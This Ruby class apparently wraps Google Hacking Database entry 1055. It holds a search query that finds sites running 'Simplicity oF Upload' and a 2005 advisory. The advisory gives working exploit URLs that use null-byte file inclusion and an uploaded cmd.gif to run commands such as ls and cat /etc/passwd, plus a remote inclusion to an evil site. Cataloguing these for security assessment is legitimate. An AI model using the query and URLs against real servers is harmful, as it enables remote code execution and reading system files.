module Dorks
   class Dork1055 < Vulpes::Dork

      def initialize
         super({
            name: "Dork 1055",
            ghdb_url: "https://www.exploit-db.com/ghdb/1055",
            severity: "3",
            category: "vulnerable_files",
            publish_date: "2005-08-07",
            author: "anonymous",
            dork: <<~EDORK,
"Powered By: Simplicity oF Upload" inurl:download.php | inurl:upload.php
EDORK
            description: <<~EDESC
26/07/2005 16.09.18Simplicity OF Upload 1.3 (possibly prior versons) remote code execution & cross site scriptingsoftware: author site: http://www.phpsimplicity.com/scripts.php?id=3remote commands execution:problem at line 25-30: ...//check for language overriding..if (isset($_GET['language'])) $language = strtolower($_GET['language']);//now we include the language filerequire_once("$language.lng");...you can include whatever adding a null byte to "language" parameter value:example:http://localhost:30/simply/download.php?language=upload.php%00you will see upload & download page together :)so you can upload a cmd.gif (when you upload a .php file, usually it isrenamed to .html...) file with this php code inside to executecommands:then try this url:http://[target]/[path]/download.php?language=cmd.gif%00&command=lsto list directorieshttp://[target]/[path]/download.php?language=cmd.gif%00&command=cat%20/etc/passwdto show /etc/passwd filecross site scripting:also, a remote user can supply a specially crafted URL to redirect other peopleto an evil page:http://[target]/[path]/download.php?language=http://[evil_site]/[evil_page]%00googledork:"Powered By: Simplicity oF Upload"
EDESC
         })

      end
   end
end
